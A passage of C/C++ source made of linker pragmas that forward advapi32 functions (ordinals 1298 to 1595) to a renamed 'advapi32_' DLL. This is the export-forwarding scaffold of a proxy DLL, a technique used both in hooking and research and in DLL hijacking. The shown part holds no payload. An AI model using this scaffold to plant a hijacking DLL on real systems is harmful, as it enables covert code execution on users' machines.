#pragma comment (linker, "/export:EventWriteTransfer=advapi32_.EventWriteTransfer,@1298")
#pragma comment (linker, "/export:FileEncryptionStatusA=advapi32_.FileEncryptionStatusA,@1299")
#pragma comment (linker, "/export:FileEncryptionStatusW=advapi32_.FileEncryptionStatusW,@1300")
#pragma comment (linker, "/export:FindFirstFreeAce=advapi32_.FindFirstFreeAce,@1301")
#pragma comment (linker, "/export:FlushEfsCache=advapi32_.FlushEfsCache,@1302")
#pragma comment (linker, "/export:FlushTraceA=advapi32_.FlushTraceA,@1303")
#pragma comment (linker, "/export:FlushTraceW=advapi32_.FlushTraceW,@1304")
#pragma comment (linker, "/export:FreeEncryptedFileKeyInfo=advapi32_.FreeEncryptedFileKeyInfo,@1305")
#pragma comment (linker, "/export:FreeEncryptedFileMetadata=advapi32_.FreeEncryptedFileMetadata,@1306")
#pragma comment (linker, "/export:FreeEncryptionCertificateHashList=advapi32_.FreeEncryptionCertificateHashList,@1307")
#pragma comment (linker, "/export:FreeInheritedFromArray=advapi32_.FreeInheritedFromArray,@1308")
#pragma comment (linker, "/export:FreeSid=advapi32_.FreeSid,@1309")
#pragma comment (linker, "/export:GetAccessPermissionsForObjectA=advapi32_.GetAccessPermissionsForObjectA,@1310")
#pragma comment (linker, "/export:GetAccessPermissionsForObjectW=advapi32_.GetAccessPermissionsForObjectW,@1311")
#pragma comment (linker, "/export:GetAce=advapi32_.GetAce,@1312")
#pragma comment (linker, "/export:GetAclInformation=advapi32_.GetAclInformation,@1313")
#pragma comment (linker, "/export:GetAuditedPermissionsFromAclA=advapi32_.GetAuditedPermissionsFromAclA,@1314")
#pragma comment (linker, "/export:GetAuditedPermissionsFromAclW=advapi32_.GetAuditedPermissionsFromAclW,@1315")
#pragma comment (linker, "/export:GetCurrentHwProfileA=advapi32_.GetCurrentHwProfileA,@1316")
#pragma comment (linker, "/export:GetCurrentHwProfileW=advapi32_.GetCurrentHwProfileW,@1317")
#pragma comment (linker, "/export:GetDynamicTimeZoneInformationEffectiveYears=advapi32_.GetDynamicTimeZoneInformationEffectiveYears,@1318")
#pragma comment (linker, "/export:GetEffectiveRightsFromAclA=advapi32_.GetEffectiveRightsFromAclA,@1319")
#pragma comment (linker, "/export:GetEffectiveRightsFromAclW=advapi32_.GetEffectiveRightsFromAclW,@1320")
#pragma comment (linker, "/export:GetEncryptedFileMetadata=advapi32_.GetEncryptedFileMetadata,@1321")
#pragma comment (linker, "/export:GetEventLogInformation=advapi32_.GetEventLogInformation,@1322")
#pragma comment (linker, "/export:GetExplicitEntriesFromAclA=advapi32_.GetExplicitEntriesFromAclA,@1323")
#pragma comment (linker, "/export:GetExplicitEntriesFromAclW=advapi32_.GetExplicitEntriesFromAclW,@1324")
#pragma comment (linker, "/export:GetFileSecurityA=advapi32_.GetFileSecurityA,@1325")
#pragma comment (linker, "/export:GetFileSecurityW=advapi32_.GetFileSecurityW,@1326")
#pragma comment (linker, "/export:GetInformationCodeAuthzLevelW=advapi32_.GetInformationCodeAuthzLevelW,@1327")
#pragma comment (linker, "/export:GetInformationCodeAuthzPolicyW=advapi32_.GetInformationCodeAuthzPolicyW,@1328")
#pragma comment (linker, "/export:GetInheritanceSourceA=advapi32_.GetInheritanceSourceA,@1329")
#pragma comment (linker, "/export:GetInheritanceSourceW=advapi32_.GetInheritanceSourceW,@1330")
#pragma comment (linker, "/export:GetKernelObjectSecurity=advapi32_.GetKernelObjectSecurity,@1331")
#pragma comment (linker, "/export:GetLengthSid=advapi32_.GetLengthSid,@1332")
#pragma comment (linker, "/export:GetLocalManagedApplicationData=advapi32_.GetLocalManagedApplicationData,@1333")
#pragma comment (linker, "/export:GetLocalManagedApplications=advapi32_.GetLocalManagedApplications,@1334")
#pragma comment (linker, "/export:GetManagedApplicationCategories=advapi32_.GetManagedApplicationCategories,@1335")
#pragma comment (linker, "/export:GetManagedApplications=advapi32_.GetManagedApplications,@1336")
#pragma comment (linker, "/export:GetMultipleTrusteeA=advapi32_.GetMultipleTrusteeA,@1337")
#pragma comment (linker, "/export:GetMultipleTrusteeOperationA=advapi32_.GetMultipleTrusteeOperationA,@1338")
#pragma comment (linker, "/export:GetMultipleTrusteeOperationW=advapi32_.GetMultipleTrusteeOperationW,@1339")
#pragma comment (linker, "/export:GetMultipleTrusteeW=advapi32_.GetMultipleTrusteeW,@1340")
#pragma comment (linker, "/export:GetNamedSecurityInfoA=advapi32_.GetNamedSecurityInfoA,@1341")
#pragma comment (linker, "/export:GetNamedSecurityInfoExA=advapi32_.GetNamedSecurityInfoExA,@1342")
#pragma comment (linker, "/export:GetNamedSecurityInfoExW=advapi32_.GetNamedSecurityInfoExW,@1343")
#pragma comment (linker, "/export:GetNamedSecurityInfoW=advapi32_.GetNamedSecurityInfoW,@1344")
#pragma comment (linker, "/export:GetNumberOfEventLogRecords=advapi32_.GetNumberOfEventLogRecords,@1345")
#pragma comment (linker, "/export:GetOldestEventLogRecord=advapi32_.GetOldestEventLogRecord,@1346")
#pragma comment (linker, "/export:GetOverlappedAccessResults=advapi32_.GetOverlappedAccessResults,@1347")
#pragma comment (linker, "/export:GetPrivateObjectSecurity=advapi32_.GetPrivateObjectSecurity,@1348")
#pragma comment (linker, "/export:GetSecurityDescriptorControl=advapi32_.GetSecurityDescriptorControl,@1349")
#pragma comment (linker, "/export:GetSecurityDescriptorDacl=advapi32_.GetSecurityDescriptorDacl,@1350")
#pragma comment (linker, "/export:GetSecurityDescriptorGroup=advapi32_.GetSecurityDescriptorGroup,@1351")
#pragma comment (linker, "/export:GetSecurityDescriptorLength=advapi32_.GetSecurityDescriptorLength,@1352")
#pragma comment (linker, "/export:GetSecurityDescriptorOwner=advapi32_.GetSecurityDescriptorOwner,@1353")
#pragma comment (linker, "/export:GetSecurityDescriptorRMControl=advapi32_.GetSecurityDescriptorRMControl,@1354")
#pragma comment (linker, "/export:GetSecurityDescriptorSacl=advapi32_.GetSecurityDescriptorSacl,@1355")
#pragma comment (linker, "/export:GetSecurityInfo=advapi32_.GetSecurityInfo,@1356")
#pragma comment (linker, "/export:GetSecurityInfoExA=advapi32_.GetSecurityInfoExA,@1357")
#pragma comment (linker, "/export:GetSecurityInfoExW=advapi32_.GetSecurityInfoExW,@1358")
#pragma comment (linker, "/export:GetServiceDisplayNameA=advapi32_.GetServiceDisplayNameA,@1359")
#pragma comment (linker, "/export:GetServiceDisplayNameW=advapi32_.GetServiceDisplayNameW,@1360")
#pragma comment (linker, "/export:GetServiceKeyNameA=advapi32_.GetServiceKeyNameA,@1361")
#pragma comment (linker, "/export:GetServiceKeyNameW=advapi32_.GetServiceKeyNameW,@1362")
#pragma comment (linker, "/export:GetSidIdentifierAuthority=advapi32_.GetSidIdentifierAuthority,@1363")
#pragma comment (linker, "/export:GetSidLengthRequired=advapi32_.GetSidLengthRequired,@1364")
#pragma comment (linker, "/export:GetSidSubAuthority=advapi32_.GetSidSubAuthority,@1365")
#pragma comment (linker, "/export:GetSidSubAuthorityCount=advapi32_.GetSidSubAuthorityCount,@1366")
#pragma comment (linker, "/export:GetStringConditionFromBinary=advapi32_.GetStringConditionFromBinary,@1367")
#pragma comment (linker, "/export:GetThreadWaitChain=advapi32_.GetThreadWaitChain,@1368")
#pragma comment (linker, "/export:GetTokenInformation=advapi32_.GetTokenInformation,@1369")
#pragma comment (linker, "/export:GetTraceEnableFlags=advapi32_.GetTraceEnableFlags,@1370")
#pragma comment (linker, "/export:GetTraceEnableLevel=advapi32_.GetTraceEnableLevel,@1371")
#pragma comment (linker, "/export:GetTraceLoggerHandle=advapi32_.GetTraceLoggerHandle,@1372")
#pragma comment (linker, "/export:GetTrusteeFormA=advapi32_.GetTrusteeFormA,@1373")
#pragma comment (linker, "/export:GetTrusteeFormW=advapi32_.GetTrusteeFormW,@1374")
#pragma comment (linker, "/export:GetTrusteeNameA=advapi32_.GetTrusteeNameA,@1375")
#pragma comment (linker, "/export:GetTrusteeNameW=advapi32_.GetTrusteeNameW,@1376")
#pragma comment (linker, "/export:GetTrusteeTypeA=advapi32_.GetTrusteeTypeA,@1377")
#pragma comment (linker, "/export:GetTrusteeTypeW=advapi32_.GetTrusteeTypeW,@1378")
#pragma comment (linker, "/export:GetUserNameA=advapi32_.GetUserNameA,@1379")
#pragma comment (linker, "/export:GetUserNameW=advapi32_.GetUserNameW,@1380")
#pragma comment (linker, "/export:GetWindowsAccountDomainSid=advapi32_.GetWindowsAccountDomainSid,@1381")
#pragma comment (linker, "/export:I_QueryTagInformation=advapi32_.I_QueryTagInformation,@1382")
#pragma comment (linker, "/export:I_ScGetCurrentGroupStateW=advapi32_.I_ScGetCurrentGroupStateW,@1001")
#pragma comment (linker, "/export:I_ScIsSecurityProcess=advapi32_.I_ScIsSecurityProcess,@1383")
#pragma comment (linker, "/export:I_ScPnPGetServiceName=advapi32_.I_ScPnPGetServiceName,@1384")
#pragma comment (linker, "/export:I_ScQueryServiceConfig=advapi32_.I_ScQueryServiceConfig,@1385")
#pragma comment (linker, "/export:I_ScRegisterPreshutdownRestart=advapi32_.I_ScRegisterPreshutdownRestart,@1386")
#pragma comment (linker, "/export:I_ScSendPnPMessage=advapi32_.I_ScSendPnPMessage,@1387")
#pragma comment (linker, "/export:I_ScSendTSMessage=advapi32_.I_ScSendTSMessage,@1388")
#pragma comment (linker, "/export:I_ScSetServiceBitsA=advapi32_.I_ScSetServiceBitsA,@1389")
#pragma comment (linker, "/export:I_ScSetServiceBitsW=advapi32_.I_ScSetServiceBitsW,@1390")
#pragma comment (linker, "/export:I_ScValidatePnPService=advapi32_.I_ScValidatePnPService,@1391")
#pragma comment (linker, "/export:IdentifyCodeAuthzLevelW=advapi32_.IdentifyCodeAuthzLevelW,@1392")
#pragma comment (linker, "/export:ImpersonateAnonymousToken=advapi32_.ImpersonateAnonymousToken,@1393")
#pragma comment (linker, "/export:ImpersonateLoggedOnUser=advapi32_.ImpersonateLoggedOnUser,@1394")
#pragma comment (linker, "/export:ImpersonateNamedPipeClient=advapi32_.ImpersonateNamedPipeClient,@1395")
#pragma comment (linker, "/export:ImpersonateSelf=advapi32_.ImpersonateSelf,@1396")
#pragma comment (linker, "/export:InitializeAcl=advapi32_.InitializeAcl,@1397")
#pragma comment (linker, "/export:InitializeSecurityDescriptor=advapi32_.InitializeSecurityDescriptor,@1398")
#pragma comment (linker, "/export:InitializeSid=advapi32_.InitializeSid,@1399")
#pragma comment (linker, "/export:InitiateShutdownA=advapi32_.InitiateShutdownA,@1400")
#pragma comment (linker, "/export:InitiateShutdownW=advapi32_.InitiateShutdownW,@1401")
#pragma comment (linker, "/export:InitiateSystemShutdownA=advapi32_.InitiateSystemShutdownA,@1402")
#pragma comment (linker, "/export:InitiateSystemShutdownExA=advapi32_.InitiateSystemShutdownExA,@1403")
#pragma comment (linker, "/export:InitiateSystemShutdownExW=advapi32_.InitiateSystemShutdownExW,@1404")
#pragma comment (linker, "/export:InitiateSystemShutdownW=advapi32_.InitiateSystemShutdownW,@1405")
#pragma comment (linker, "/export:InstallApplication=advapi32_.InstallApplication,@1406")
#pragma comment (linker, "/export:IsTextUnicode=advapi32_.IsTextUnicode,@1407")
#pragma comment (linker, "/export:IsTokenRestricted=advapi32_.IsTokenRestricted,@1408")
#pragma comment (linker, "/export:IsTokenUntrusted=advapi32_.IsTokenUntrusted,@1409")
#pragma comment (linker, "/export:IsValidAcl=advapi32_.IsValidAcl,@1410")
#pragma comment (linker, "/export:IsValidRelativeSecurityDescriptor=advapi32_.IsValidRelativeSecurityDescriptor,@1411")
#pragma comment (linker, "/export:IsValidSecurityDescriptor=advapi32_.IsValidSecurityDescriptor,@1412")
#pragma comment (linker, "/export:IsValidSid=advapi32_.IsValidSid,@1413")
#pragma comment (linker, "/export:IsWellKnownSid=advapi32_.IsWellKnownSid,@1414")
#pragma comment (linker, "/export:LockServiceDatabase=advapi32_.LockServiceDatabase,@1415")
#pragma comment (linker, "/export:LogonUserA=advapi32_.LogonUserA,@1416")
#pragma comment (linker, "/export:LogonUserExA=advapi32_.LogonUserExA,@1417")
#pragma comment (linker, "/export:LogonUserExExW=advapi32_.LogonUserExExW,@1418")
#pragma comment (linker, "/export:LogonUserExW=advapi32_.LogonUserExW,@1419")
#pragma comment (linker, "/export:LogonUserW=advapi32_.LogonUserW,@1420")
#pragma comment (linker, "/export:LookupAccountNameA=advapi32_.LookupAccountNameA,@1421")
#pragma comment (linker, "/export:LookupAccountNameW=advapi32_.LookupAccountNameW,@1422")
#pragma comment (linker, "/export:LookupAccountSidA=advapi32_.LookupAccountSidA,@1423")
#pragma comment (linker, "/export:LookupAccountSidW=advapi32_.LookupAccountSidW,@1424")
#pragma comment (linker, "/export:LookupPrivilegeDisplayNameA=advapi32_.LookupPrivilegeDisplayNameA,@1425")
#pragma comment (linker, "/export:LookupPrivilegeDisplayNameW=advapi32_.LookupPrivilegeDisplayNameW,@1426")
#pragma comment (linker, "/export:LookupPrivilegeNameA=advapi32_.LookupPrivilegeNameA,@1427")
#pragma comment (linker, "/export:LookupPrivilegeNameW=advapi32_.LookupPrivilegeNameW,@1428")
#pragma comment (linker, "/export:LookupPrivilegeValueA=advapi32_.LookupPrivilegeValueA,@1429")
#pragma comment (linker, "/export:LookupPrivilegeValueW=advapi32_.LookupPrivilegeValueW,@1430")
#pragma comment (linker, "/export:LookupSecurityDescriptorPartsA=advapi32_.LookupSecurityDescriptorPartsA,@1431")
#pragma comment (linker, "/export:LookupSecurityDescriptorPartsW=advapi32_.LookupSecurityDescriptorPartsW,@1432")
#pragma comment (linker, "/export:LsaAddAccountRights=advapi32_.LsaAddAccountRights,@1433")
#pragma comment (linker, "/export:LsaAddPrivilegesToAccount=advapi32_.LsaAddPrivilegesToAccount,@1434")
#pragma comment (linker, "/export:LsaClearAuditLog=advapi32_.LsaClearAuditLog,@1435")
#pragma comment (linker, "/export:LsaClose=advapi32_.LsaClose,@1436")
#pragma comment (linker, "/export:LsaCreateAccount=advapi32_.LsaCreateAccount,@1437")
#pragma comment (linker, "/export:LsaCreateSecret=advapi32_.LsaCreateSecret,@1438")
#pragma comment (linker, "/export:LsaCreateTrustedDomain=advapi32_.LsaCreateTrustedDomain,@1439")
#pragma comment (linker, "/export:LsaCreateTrustedDomainEx=advapi32_.LsaCreateTrustedDomainEx,@1440")
#pragma comment (linker, "/export:LsaDelete=advapi32_.LsaDelete,@1441")
#pragma comment (linker, "/export:LsaDeleteTrustedDomain=advapi32_.LsaDeleteTrustedDomain,@1442")
#pragma comment (linker, "/export:LsaEnumerateAccountRights=advapi32_.LsaEnumerateAccountRights,@1443")
#pragma comment (linker, "/export:LsaEnumerateAccounts=advapi32_.LsaEnumerateAccounts,@1444")
#pragma comment (linker, "/export:LsaEnumerateAccountsWithUserRight=advapi32_.LsaEnumerateAccountsWithUserRight,@1445")
#pragma comment (linker, "/export:LsaEnumeratePrivileges=advapi32_.LsaEnumeratePrivileges,@1446")
#pragma comment (linker, "/export:LsaEnumeratePrivilegesOfAccount=advapi32_.LsaEnumeratePrivilegesOfAccount,@1447")
#pragma comment (linker, "/export:LsaEnumerateTrustedDomains=advapi32_.LsaEnumerateTrustedDomains,@1448")
#pragma comment (linker, "/export:LsaEnumerateTrustedDomainsEx=advapi32_.LsaEnumerateTrustedDomainsEx,@1449")
#pragma comment (linker, "/export:LsaFreeMemory=advapi32_.LsaFreeMemory,@1450")
#pragma comment (linker, "/export:LsaGetAppliedCAPIDs=advapi32_.LsaGetAppliedCAPIDs,@1451")
#pragma comment (linker, "/export:LsaGetQuotasForAccount=advapi32_.LsaGetQuotasForAccount,@1452")
#pragma comment (linker, "/export:LsaGetRemoteUserName=advapi32_.LsaGetRemoteUserName,@1453")
#pragma comment (linker, "/export:LsaGetSystemAccessAccount=advapi32_.LsaGetSystemAccessAccount,@1454")
#pragma comment (linker, "/export:LsaGetUserName=advapi32_.LsaGetUserName,@1455")
#pragma comment (linker, "/export:LsaICLookupNames=advapi32_.LsaICLookupNames,@1456")
#pragma comment (linker, "/export:LsaICLookupNamesWithCreds=advapi32_.LsaICLookupNamesWithCreds,@1457")
#pragma comment (linker, "/export:LsaICLookupSids=advapi32_.LsaICLookupSids,@1458")
#pragma comment (linker, "/export:LsaICLookupSidsWithCreds=advapi32_.LsaICLookupSidsWithCreds,@1459")
#pragma comment (linker, "/export:LsaLookupNames=advapi32_.LsaLookupNames,@1460")
#pragma comment (linker, "/export:LsaLookupNames2=advapi32_.LsaLookupNames2,@1461")
#pragma comment (linker, "/export:LsaLookupPrivilegeDisplayName=advapi32_.LsaLookupPrivilegeDisplayName,@1462")
#pragma comment (linker, "/export:LsaLookupPrivilegeName=advapi32_.LsaLookupPrivilegeName,@1463")
#pragma comment (linker, "/export:LsaLookupPrivilegeValue=advapi32_.LsaLookupPrivilegeValue,@1464")
#pragma comment (linker, "/export:LsaLookupSids=advapi32_.LsaLookupSids,@1465")
#pragma comment (linker, "/export:LsaLookupSids2=advapi32_.LsaLookupSids2,@1466")
#pragma comment (linker, "/export:LsaManageSidNameMapping=advapi32_.LsaManageSidNameMapping,@1467")
#pragma comment (linker, "/export:LsaNtStatusToWinError=advapi32_.LsaNtStatusToWinError,@1468")
#pragma comment (linker, "/export:LsaOpenAccount=advapi32_.LsaOpenAccount,@1469")
#pragma comment (linker, "/export:LsaOpenPolicy=advapi32_.LsaOpenPolicy,@1470")
#pragma comment (linker, "/export:LsaOpenPolicySce=advapi32_.LsaOpenPolicySce,@1471")
#pragma comment (linker, "/export:LsaOpenSecret=advapi32_.LsaOpenSecret,@1472")
#pragma comment (linker, "/export:LsaOpenTrustedDomain=advapi32_.LsaOpenTrustedDomain,@1473")
#pragma comment (linker, "/export:LsaOpenTrustedDomainByName=advapi32_.LsaOpenTrustedDomainByName,@1474")
#pragma comment (linker, "/export:LsaQueryCAPs=advapi32_.LsaQueryCAPs,@1475")
#pragma comment (linker, "/export:LsaQueryDomainInformationPolicy=advapi32_.LsaQueryDomainInformationPolicy,@1476")
#pragma comment (linker, "/export:LsaQueryForestTrustInformation=advapi32_.LsaQueryForestTrustInformation,@1477")
#pragma comment (linker, "/export:LsaQueryInfoTrustedDomain=advapi32_.LsaQueryInfoTrustedDomain,@1478")
#pragma comment (linker, "/export:LsaQueryInformationPolicy=advapi32_.LsaQueryInformationPolicy,@1479")
#pragma comment (linker, "/export:LsaQuerySecret=advapi32_.LsaQuerySecret,@1480")
#pragma comment (linker, "/export:LsaQuerySecurityObject=advapi32_.LsaQuerySecurityObject,@1481")
#pragma comment (linker, "/export:LsaQueryTrustedDomainInfo=advapi32_.LsaQueryTrustedDomainInfo,@1482")
#pragma comment (linker, "/export:LsaQueryTrustedDomainInfoByName=advapi32_.LsaQueryTrustedDomainInfoByName,@1483")
#pragma comment (linker, "/export:LsaRemoveAccountRights=advapi32_.LsaRemoveAccountRights,@1484")
#pragma comment (linker, "/export:LsaRemovePrivilegesFromAccount=advapi32_.LsaRemovePrivilegesFromAccount,@1485")
#pragma comment (linker, "/export:LsaRetrievePrivateData=advapi32_.LsaRetrievePrivateData,@1486")
#pragma comment (linker, "/export:LsaSetCAPs=advapi32_.LsaSetCAPs,@1487")
#pragma comment (linker, "/export:LsaSetDomainInformationPolicy=advapi32_.LsaSetDomainInformationPolicy,@1488")
#pragma comment (linker, "/export:LsaSetForestTrustInformation=advapi32_.LsaSetForestTrustInformation,@1489")
#pragma comment (linker, "/export:LsaSetInformationPolicy=advapi32_.LsaSetInformationPolicy,@1490")
#pragma comment (linker, "/export:LsaSetInformationTrustedDomain=advapi32_.LsaSetInformationTrustedDomain,@1491")
#pragma comment (linker, "/export:LsaSetQuotasForAccount=advapi32_.LsaSetQuotasForAccount,@1492")
#pragma comment (linker, "/export:LsaSetSecret=advapi32_.LsaSetSecret,@1493")
#pragma comment (linker, "/export:LsaSetSecurityObject=advapi32_.LsaSetSecurityObject,@1494")
#pragma comment (linker, "/export:LsaSetSystemAccessAccount=advapi32_.LsaSetSystemAccessAccount,@1495")
#pragma comment (linker, "/export:LsaSetTrustedDomainInfoByName=advapi32_.LsaSetTrustedDomainInfoByName,@1496")
#pragma comment (linker, "/export:LsaSetTrustedDomainInformation=advapi32_.LsaSetTrustedDomainInformation,@1497")
#pragma comment (linker, "/export:LsaStorePrivateData=advapi32_.LsaStorePrivateData,@1498")
#pragma comment (linker, "/export:MD4Final=advapi32_.MD4Final,@1499")
#pragma comment (linker, "/export:MD4Init=advapi32_.MD4Init,@1500")
#pragma comment (linker, "/export:MD4Update=advapi32_.MD4Update,@1501")
#pragma comment (linker, "/export:MD5Final=advapi32_.MD5Final,@1502")
#pragma comment (linker, "/export:MD5Init=advapi32_.MD5Init,@1503")
#pragma comment (linker, "/export:MD5Update=advapi32_.MD5Update,@1504")
#pragma comment (linker, "/export:MIDL_user_free_Ext=advapi32_.MIDL_user_free_Ext,@1505")
#pragma comment (linker, "/export:MSChapSrvChangePassword=advapi32_.MSChapSrvChangePassword,@1506")
#pragma comment (linker, "/export:MSChapSrvChangePassword2=advapi32_.MSChapSrvChangePassword2,@1507")
#pragma comment (linker, "/export:MakeAbsoluteSD=advapi32_.MakeAbsoluteSD,@1508")
#pragma comment (linker, "/export:MakeAbsoluteSD2=advapi32_.MakeAbsoluteSD2,@1509")
#pragma comment (linker, "/export:MakeSelfRelativeSD=advapi32_.MakeSelfRelativeSD,@1510")
#pragma comment (linker, "/export:MapGenericMask=advapi32_.MapGenericMask,@1511")
#pragma comment (linker, "/export:NotifyBootConfigStatus=advapi32_.NotifyBootConfigStatus,@1512")
#pragma comment (linker, "/export:NotifyChangeEventLog=advapi32_.NotifyChangeEventLog,@1513")
#pragma comment (linker, "/export:NotifyServiceStatusChange=advapi32_.NotifyServiceStatusChange,@1514")
#pragma comment (linker, "/export:NotifyServiceStatusChangeA=advapi32_.NotifyServiceStatusChangeA,@1515")
#pragma comment (linker, "/export:NotifyServiceStatusChangeW=advapi32_.NotifyServiceStatusChangeW,@1516")
#pragma comment (linker, "/export:NpGetUserName=advapi32_.NpGetUserName,@1517")
#pragma comment (linker, "/export:ObjectCloseAuditAlarmA=advapi32_.ObjectCloseAuditAlarmA,@1518")
#pragma comment (linker, "/export:ObjectCloseAuditAlarmW=advapi32_.ObjectCloseAuditAlarmW,@1519")
#pragma comment (linker, "/export:ObjectDeleteAuditAlarmA=advapi32_.ObjectDeleteAuditAlarmA,@1520")
#pragma comment (linker, "/export:ObjectDeleteAuditAlarmW=advapi32_.ObjectDeleteAuditAlarmW,@1521")
#pragma comment (linker, "/export:ObjectOpenAuditAlarmA=advapi32_.ObjectOpenAuditAlarmA,@1522")
#pragma comment (linker, "/export:ObjectOpenAuditAlarmW=advapi32_.ObjectOpenAuditAlarmW,@1523")
#pragma comment (linker, "/export:ObjectPrivilegeAuditAlarmA=advapi32_.ObjectPrivilegeAuditAlarmA,@1524")
#pragma comment (linker, "/export:ObjectPrivilegeAuditAlarmW=advapi32_.ObjectPrivilegeAuditAlarmW,@1525")
#pragma comment (linker, "/export:OpenBackupEventLogA=advapi32_.OpenBackupEventLogA,@1526")
#pragma comment (linker, "/export:OpenBackupEventLogW=advapi32_.OpenBackupEventLogW,@1527")
#pragma comment (linker, "/export:OpenEncryptedFileRawA=advapi32_.OpenEncryptedFileRawA,@1528")
#pragma comment (linker, "/export:OpenEncryptedFileRawW=advapi32_.OpenEncryptedFileRawW,@1529")
#pragma comment (linker, "/export:OpenEventLogA=advapi32_.OpenEventLogA,@1530")
#pragma comment (linker, "/export:OpenEventLogW=advapi32_.OpenEventLogW,@1531")
#pragma comment (linker, "/export:OpenProcessToken=advapi32_.OpenProcessToken,@1532")
#pragma comment (linker, "/export:OpenSCManagerA=advapi32_.OpenSCManagerA,@1533")
#pragma comment (linker, "/export:OpenSCManagerW=advapi32_.OpenSCManagerW,@1534")
#pragma comment (linker, "/export:OpenServiceA=advapi32_.OpenServiceA,@1535")
#pragma comment (linker, "/export:OpenServiceW=advapi32_.OpenServiceW,@1536")
#pragma comment (linker, "/export:OpenThreadToken=advapi32_.OpenThreadToken,@1537")
#pragma comment (linker, "/export:OpenThreadWaitChainSession=advapi32_.OpenThreadWaitChainSession,@1538")
#pragma comment (linker, "/export:OpenTraceA=advapi32_.OpenTraceA,@1539")
#pragma comment (linker, "/export:OpenTraceW=advapi32_.OpenTraceW,@1540")
#pragma comment (linker, "/export:OperationEnd=advapi32_.OperationEnd,@1541")
#pragma comment (linker, "/export:OperationStart=advapi32_.OperationStart,@1542")
#pragma comment (linker, "/export:PerfAddCounters=advapi32_.PerfAddCounters,@1543")
#pragma comment (linker, "/export:PerfCloseQueryHandle=advapi32_.PerfCloseQueryHandle,@1544")
#pragma comment (linker, "/export:PerfCreateInstance=advapi32_.PerfCreateInstance,@1545")
#pragma comment (linker, "/export:PerfDecrementULongCounterValue=advapi32_.PerfDecrementULongCounterValue,@1546")
#pragma comment (linker, "/export:PerfDecrementULongLongCounterValue=advapi32_.PerfDecrementULongLongCounterValue,@1547")
#pragma comment (linker, "/export:PerfDeleteCounters=advapi32_.PerfDeleteCounters,@1548")
#pragma comment (linker, "/export:PerfDeleteInstance=advapi32_.PerfDeleteInstance,@1549")
#pragma comment (linker, "/export:PerfEnumerateCounterSet=advapi32_.PerfEnumerateCounterSet,@1550")
#pragma comment (linker, "/export:PerfEnumerateCounterSetInstances=advapi32_.PerfEnumerateCounterSetInstances,@1551")
#pragma comment (linker, "/export:PerfIncrementULongCounterValue=advapi32_.PerfIncrementULongCounterValue,@1552")
#pragma comment (linker, "/export:PerfIncrementULongLongCounterValue=advapi32_.PerfIncrementULongLongCounterValue,@1553")
#pragma comment (linker, "/export:PerfOpenQueryHandle=advapi32_.PerfOpenQueryHandle,@1554")
#pragma comment (linker, "/export:PerfQueryCounterData=advapi32_.PerfQueryCounterData,@1555")
#pragma comment (linker, "/export:PerfQueryCounterInfo=advapi32_.PerfQueryCounterInfo,@1556")
#pragma comment (linker, "/export:PerfQueryCounterSetRegistrationInfo=advapi32_.PerfQueryCounterSetRegistrationInfo,@1557")
#pragma comment (linker, "/export:PerfQueryInstance=advapi32_.PerfQueryInstance,@1558")
#pragma comment (linker, "/export:PerfRegCloseKey=advapi32_.PerfRegCloseKey,@1559")
#pragma comment (linker, "/export:PerfRegEnumKey=advapi32_.PerfRegEnumKey,@1560")
#pragma comment (linker, "/export:PerfRegEnumValue=advapi32_.PerfRegEnumValue,@1561")
#pragma comment (linker, "/export:PerfRegQueryInfoKey=advapi32_.PerfRegQueryInfoKey,@1562")
#pragma comment (linker, "/export:PerfRegQueryValue=advapi32_.PerfRegQueryValue,@1563")
#pragma comment (linker, "/export:PerfRegSetValue=advapi32_.PerfRegSetValue,@1564")
#pragma comment (linker, "/export:PerfSetCounterRefValue=advapi32_.PerfSetCounterRefValue,@1565")
#pragma comment (linker, "/export:PerfSetCounterSetInfo=advapi32_.PerfSetCounterSetInfo,@1566")
#pragma comment (linker, "/export:PerfSetULongCounterValue=advapi32_.PerfSetULongCounterValue,@1567")
#pragma comment (linker, "/export:PerfSetULongLongCounterValue=advapi32_.PerfSetULongLongCounterValue,@1568")
#pragma comment (linker, "/export:PerfStartProvider=advapi32_.PerfStartProvider,@1569")
#pragma comment (linker, "/export:PerfStartProviderEx=advapi32_.PerfStartProviderEx,@1570")
#pragma comment (linker, "/export:PerfStopProvider=advapi32_.PerfStopProvider,@1571")
#pragma comment (linker, "/export:PrivilegeCheck=advapi32_.PrivilegeCheck,@1572")
#pragma comment (linker, "/export:PrivilegedServiceAuditAlarmA=advapi32_.PrivilegedServiceAuditAlarmA,@1573")
#pragma comment (linker, "/export:PrivilegedServiceAuditAlarmW=advapi32_.PrivilegedServiceAuditAlarmW,@1574")
#pragma comment (linker, "/export:ProcessIdleTasks=advapi32_.ProcessIdleTasks,@1575")
#pragma comment (linker, "/export:ProcessIdleTasksW=advapi32_.ProcessIdleTasksW,@1576")
#pragma comment (linker, "/export:ProcessTrace=advapi32_.ProcessTrace,@1577")
#pragma comment (linker, "/export:QueryAllTracesA=advapi32_.QueryAllTracesA,@1578")
#pragma comment (linker, "/export:QueryAllTracesW=advapi32_.QueryAllTracesW,@1579")
#pragma comment (linker, "/export:QueryRecoveryAgentsOnEncryptedFile=advapi32_.QueryRecoveryAgentsOnEncryptedFile,@1580")
#pragma comment (linker, "/export:QuerySecurityAccessMask=advapi32_.QuerySecurityAccessMask,@1581")
#pragma comment (linker, "/export:QueryServiceConfig2A=advapi32_.QueryServiceConfig2A,@1582")
#pragma comment (linker, "/export:QueryServiceConfig2W=advapi32_.QueryServiceConfig2W,@1583")
#pragma comment (linker, "/export:QueryServiceConfigA=advapi32_.QueryServiceConfigA,@1584")
#pragma comment (linker, "/export:QueryServiceConfigW=advapi32_.QueryServiceConfigW,@1585")
#pragma comment (linker, "/export:QueryServiceDynamicInformation=advapi32_.QueryServiceDynamicInformation,@1586")
#pragma comment (linker, "/export:QueryServiceLockStatusA=advapi32_.QueryServiceLockStatusA,@1587")
#pragma comment (linker, "/export:QueryServiceLockStatusW=advapi32_.QueryServiceLockStatusW,@1588")
#pragma comment (linker, "/export:QueryServiceObjectSecurity=advapi32_.QueryServiceObjectSecurity,@1589")
#pragma comment (linker, "/export:QueryServiceStatus=advapi32_.QueryServiceStatus,@1590")
#pragma comment (linker, "/export:QueryServiceStatusEx=advapi32_.QueryServiceStatusEx,@1591")
#pragma comment (linker, "/export:QueryTraceA=advapi32_.QueryTraceA,@1592")
#pragma comment (linker, "/export:QueryTraceW=advapi32_.QueryTraceW,@1593")
#pragma comment (linker, "/export:QueryUsersOnEncryptedFile=advapi32_.QueryUsersOnEncryptedFile,@1594")
#pragma comment (linker, "/export:ReadEncryptedFileRaw=advapi32_.ReadEncryptedFileRaw,@1595")
